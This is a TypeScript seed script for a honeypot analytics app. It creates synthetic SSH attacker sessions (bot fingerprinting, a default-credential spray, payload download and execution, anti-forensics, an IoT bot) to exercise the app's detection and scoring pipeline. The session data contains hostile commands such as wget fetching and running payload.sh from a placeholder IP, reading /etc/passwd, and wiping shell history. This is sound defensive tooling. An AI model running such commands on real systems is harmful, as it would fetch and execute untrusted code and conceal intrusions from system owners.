/**
 * Seed intelligence data for development / demo purposes.
 * Run: npm run seed:intelligence
 *
 * Creates representative sessions that exercise every intelligence path:
 *  - repeated uname fingerprint patterns (BOT)
 *  - root/password credential patterns
 *  - human-like navigation session (HUMAN)
 *  - payload execution chain (ADVANCED / CRITICAL)
 *  - anti-forensics chain (ADVANCED / HIGH)
 *  - IoT bot chain (BOT / MEDIUM)
 */

import { PrismaClient, EventType } from "@prisma/client";
import { createHash } from "crypto";
import { updateCommandPattern, updateCredentialPattern } from "../src/lib/intelligence/patterns";
import { updateActorProfile } from "../src/lib/intelligence/actors";
import { detectAttackChains } from "../src/lib/intelligence/chains";
import { scoreSession } from "../src/lib/intelligence/scorer";

const prisma = new PrismaClient();

function sha256(s: string) {
  return createHash("sha256").update(s).digest("hex");
}

async function ensureHoneypot() {
  const existing = await prisma.honeypot.findFirst();
  if (existing) return existing;
  return prisma.honeypot.create({
    data: {
      name: "SSH Honeypot Alpha",
      type: "SSH",
      status: "STOPPED",
      publicPort: 2222,
      dockerService: "cowrie",
      configJson: { hostname: "ubuntu-server", version: "OpenSSH_8.9p1" },
    },
  });
}

interface RawEvent {
  type: EventType;
  command?: string;
  username?: string;
  passwordHash?: string;
  tsOffset: number; // seconds from session start
}

async function createSession(params: {
  honeypotId: string;
  sourceIp: string;
  events: RawEvent[];
  durationSeconds: number;
}) {
  const { honeypotId, sourceIp, events, durationSeconds } = params;
  const startedAt = new Date(Date.now() - Math.random() * 86400000);
  const endedAt = new Date(startedAt.getTime() + durationSeconds * 1000);

  const commands = events.filter((e) => e.command).map((e) => e.command!);
  const loginAttempts = events.filter(
    (e) => e.type === EventType.LOGIN_FAILED || e.type === EventType.LOGIN_SUCCESS
  ).length;
  const hasLoginSuccess = events.some((e) => e.type === EventType.LOGIN_SUCCESS);

  const { riskLevel, actorType } = scoreSession({
    commands,
    loginAttempts,
    loginSuccess: hasLoginSuccess,
    sessionDurationSeconds: durationSeconds,
  });

  const session = await prisma.session.create({
    data: {
      honeypotId,
      sourceIp,
      startedAt,
      endedAt,
      riskLevel,
      actorType,
    },
  });

  for (const ev of events) {
    await prisma.event.create({
      data: {
        sessionId: session.id,
        eventType: ev.type,
        command: ev.command ?? null,
        username: ev.username ?? null,
        password: ev.passwordHash ?? null,
        rawJson: { seed: true, ...ev },
        createdAt: new Date(startedAt.getTime() + ev.tsOffset * 1000),
      },
    });
  }

  // Run intelligence pipeline
  const usernames = [...new Set(events.filter((e) => e.username).map((e) => e.username!))];
  const passwordHashMap = new Map<string, string>();
  for (const ev of events) {
    if (ev.username && ev.passwordHash) passwordHashMap.set(ev.username, ev.passwordHash);
  }

  for (const cmd of commands) {
    await updateCommandPattern({ command: cmd, sourceIp }).catch(console.error);
  }
  for (const username of usernames) {
    const hash = passwordHashMap.get(username);
    if (hash) {
      await updateCredentialPattern({ username, passwordHash: hash, sourceIp }).catch(console.error);
    }
  }
  await updateActorProfile({
    sourceIp, actorType, riskLevel, commands, usernames,
    eventCount: events.length, isNewSession: true,
  }).catch(console.error);
  await detectAttackChains({
    sessionId: session.id, honeypotId, commands, hasLoginSuccess,
  }).catch(console.error);

  return session;
}

async function main() {
  const honeypot = await ensureHoneypot();
  const hpId = honeypot.id;

  console.log(`Using honeypot: ${honeypot.name} (${hpId})`);

  // ── 1. BOT fingerprint sessions (5 IPs, repeated uname pattern) ──────────
  console.log("Creating BOT fingerprint sessions...");
  for (let i = 1; i <= 5; i++) {
    await createSession({
      honeypotId: hpId,
      sourceIp: `192.0.2.${i}`,
      durationSeconds: 3,
      events: [
        { type: EventType.CONNECTION,   tsOffset: 0 },
        { type: EventType.LOGIN_FAILED, username: "root", passwordHash: sha256("123456"),       tsOffset: 1 },
        { type: EventType.LOGIN_FAILED, username: "root", passwordHash: sha256("password"),     tsOffset: 1.5 },
        { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("admin"),       tsOffset: 2 },
        { type: EventType.COMMAND,      command: "uname -a",                                    tsOffset: 2.2 },
        { type: EventType.COMMAND,      command: "cat /etc/passwd",                             tsOffset: 2.5 },
        { type: EventType.DISCONNECT,   tsOffset: 3 },
      ],
    });
  }

  // ── 2. Credential spray (root/password from multiple IPs) ────────────────
  console.log("Creating credential spray sessions...");
  const credPairs = [
    { username: "root",  password: "password" },
    { username: "admin", password: "admin" },
    { username: "user",  password: "1234" },
    { username: "root",  password: "toor" },
    { username: "pi",    password: "raspberry" },
  ];
  for (let i = 0; i < credPairs.length; i++) {
    const { username, password } = credPairs[i];
    await createSession({
      honeypotId: hpId,
      sourceIp: `198.51.100.${10 + i}`,
      durationSeconds: 1,
      events: [
        { type: EventType.CONNECTION,   tsOffset: 0 },
        { type: EventType.LOGIN_FAILED, username, passwordHash: sha256(password), tsOffset: 0.5 },
        { type: EventType.DISCONNECT,   tsOffset: 1 },
      ],
    });
  }

  // ── 3. Human-like exploratory session ────────────────────────────────────
  console.log("Creating HUMAN session...");
  await createSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.10",
    durationSeconds: 120,
    events: [
      { type: EventType.CONNECTION,   tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("password123"), tsOffset: 2 },
      { type: EventType.COMMAND,      command: "whoami",             tsOffset: 5 },
      { type: EventType.COMMAND,      command: "lss",                tsOffset: 9 },   // typo
      { type: EventType.COMMAND,      command: "ls",                 tsOffset: 12 },
      { type: EventType.COMMAND,      command: "cd /home",           tsOffset: 18 },
      { type: EventType.COMMAND,      command: "ls",                 tsOffset: 20 },
      { type: EventType.COMMAND,      command: "cat /etc/passwd",    tsOffset: 35 },
      { type: EventType.COMMAND,      command: "cd /tmp",            tsOffset: 50 },
      { type: EventType.COMMAND,      command: "ls -la",             tsOffset: 55 },
      { type: EventType.COMMAND,      command: "id",                 tsOffset: 70 },
      { type: EventType.DISCONNECT,   tsOffset: 120 },
    ],
  });

  // ── 4. Payload execution chain ────────────────────────────────────────────
  console.log("Creating PAYLOAD EXECUTION chain session...");
  await createSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.20",
    durationSeconds: 45,
    events: [
      { type: EventType.CONNECTION,   tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("root"), tsOffset: 1 },
      { type: EventType.COMMAND,      command: "uname -a",                                       tsOffset: 2 },
      { type: EventType.COMMAND,      command: "whoami",                                         tsOffset: 4 },
      { type: EventType.COMMAND,      command: "wget http://203.0.113.99/payload.sh -O /tmp/p",  tsOffset: 8 },
      { type: EventType.COMMAND,      command: "chmod +x /tmp/p",                                tsOffset: 12 },
      { type: EventType.COMMAND,      command: "./p",                                            tsOffset: 15 },
      { type: EventType.DISCONNECT,   tsOffset: 45 },
    ],
  });

  // ── 5. Anti-forensics chain ───────────────────────────────────────────────
  console.log("Creating ANTI-FORENSICS chain session...");
  await createSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.30",
    durationSeconds: 60,
    events: [
      { type: EventType.CONNECTION,   tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("changeme"), tsOffset: 1 },
      { type: EventType.COMMAND,      command: "whoami",                             tsOffset: 2 },
      { type: EventType.COMMAND,      command: "id",                                 tsOffset: 4 },
      { type: EventType.COMMAND,      command: "export HISTFILE=/dev/null",          tsOffset: 8 },
      { type: EventType.COMMAND,      command: "unset HISTSIZE",                     tsOffset: 10 },
      { type: EventType.COMMAND,      command: "rm -f ~/.bash_history",              tsOffset: 14 },
      { type: EventType.COMMAND,      command: "history -c",                         tsOffset: 16 },
      { type: EventType.DISCONNECT,   tsOffset: 60 },
    ],
  });

  // ── 6. IoT bot chain ─────────────────────────────────────────────────────
  console.log("Creating IOT_BOT chain session...");
  await createSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.40",
    durationSeconds: 8,
    events: [
      { type: EventType.CONNECTION,   tsOffset: 0 },
      { type: EventType.LOGIN_FAILED, username: "admin",   passwordHash: sha256("admin"),   tsOffset: 0.5 },
      { type: EventType.LOGIN_SUCCESS, username: "admin",  passwordHash: sha256("1234"),    tsOffset: 1 },
      { type: EventType.COMMAND,      command: "enable",                                    tsOffset: 1.5 },
      { type: EventType.COMMAND,      command: "system",                                    tsOffset: 2 },
      { type: EventType.COMMAND,      command: "shell",                                     tsOffset: 2.5 },
      { type: EventType.COMMAND,      command: "wget http://203.0.113.99/bot.sh",           tsOffset: 3 },
      { type: EventType.DISCONNECT,   tsOffset: 8 },
    ],
  });

  // ── Summary ───────────────────────────────────────────────────────────────
  const [cmdCount, credCount, actorCount, chainCount] = await Promise.all([
    prisma.commandPattern.count(),
    prisma.credentialPattern.count(),
    prisma.actorProfile.count(),
    prisma.attackChain.count(),
  ]);

  console.log("\nSeed complete:");
  console.log(`  Command patterns:    ${cmdCount}`);
  console.log(`  Credential patterns: ${credCount}`);
  console.log(`  Actor profiles:      ${actorCount}`);
  console.log(`  Attack chains:       ${chainCount}`);
}

main()
  .catch(console.error)
  .finally(() => prisma.$disconnect());
